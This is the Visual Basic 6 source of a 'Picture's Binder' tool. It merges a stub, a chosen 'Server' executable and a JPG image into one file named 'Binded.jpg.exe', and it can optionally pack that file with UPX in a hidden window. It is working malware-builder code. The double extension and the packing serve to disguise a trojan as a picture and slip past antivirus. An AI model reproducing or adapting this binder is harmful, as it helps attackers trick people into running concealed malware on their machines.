VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   Caption         =   "Picture's Binder by t0fx (working with vista)"
   ClientHeight    =   2505
   ClientLeft      =   60
   ClientTop       =   375
   ClientWidth     =   6255
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   Picture         =   "Form1.frx":0CCA
   ScaleHeight     =   2505
   ScaleWidth      =   6255
   StartUpPosition =   3  'Windows Default
   Begin VB.CheckBox Checkupx 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      Caption         =   "Pack with UPX"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   240
      TabIndex        =   7
      Top             =   2040
      Width           =   1575
   End
   Begin MSComDlg.CommonDialog ComDlg 
      Left            =   5160
      Top             =   2040
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.TextBox txtFile2 
      Height          =   375
      Left            =   1200
      TabIndex        =   4
      Top             =   1320
      Width           =   3255
   End
   Begin VB.TextBox txtFile1 
      Height          =   375
      Left            =   1200
      TabIndex        =   3
      Top             =   720
      Width           =   3255
   End
   Begin VB.CommandButton cmdBuild 
      Caption         =   "Bind !"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2520
      TabIndex        =   2
      Top             =   1920
      Width           =   1095
   End
   Begin VB.CommandButton cmdBrowse2 
      Caption         =   "Browse..."
      Height          =   375
      Left            =   4680
      TabIndex        =   1
      Top             =   1320
      Width           =   975
   End
   Begin VB.CommandButton cmdBrowse1 
      Caption         =   "Browse..."
      Height          =   375
      Left            =   4680
      TabIndex        =   0
      Top             =   720
      Width           =   975
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   4680
      Top             =   2040
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Label Labelpic 
      BackStyle       =   0  'Transparent
      Caption         =   "Picture :"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   6
      Top             =   1320
      Width           =   975
   End
   Begin VB.Label Labelkl 
      BackStyle       =   0  'Transparent
      Caption         =   "Server :"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   5
      Top             =   720
      Width           =   975
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Dim server As String
Dim executable As String
Dim pic As String

Private Sub cmdBrowse1_Click()
ComDlg.Filter = "Executable Files (*.exe) | *.exe"
ComDlg.ShowOpen
txtFile1.Text = ComDlg.FileName
End Sub

Private Sub cmdBrowse2_Click()
ComDlg.Filter = "Picture Files (*.jpg) | *.jpg"
ComDlg.ShowOpen
txtFile2.Text = ComDlg.FileName
End Sub

Private Sub cmdBuild_Click()
Open App.Path & "\stub\stub.exe" For Binary As #1
server = Space(LOF(1))
Get #1, , server
Close #1

Open txtFile1.Text For Binary As #1
executable = Space(LOF(1))
Get #1, , executable
Close #1
Open txtFile2.Text For Binary As #1
pic = Space(LOF(1))
Get #1, , pic
Close #1
Open App.Path & "\Binded.jpg.exe" For Binary As #1
Put #1, , server + "[Split]"
Put #1, , executable + "[Split]"
Put #1, , pic + "[Split]"
Close #1
If Checkupx.Value = 1 Then
Call Shell(App.Path & "\UPX\upx.exe --best Binded.jpg.exe", vbHide)
End If
MsgBox "Saved to : " & App.Path & "\Binded.jpg.exe"
End Sub

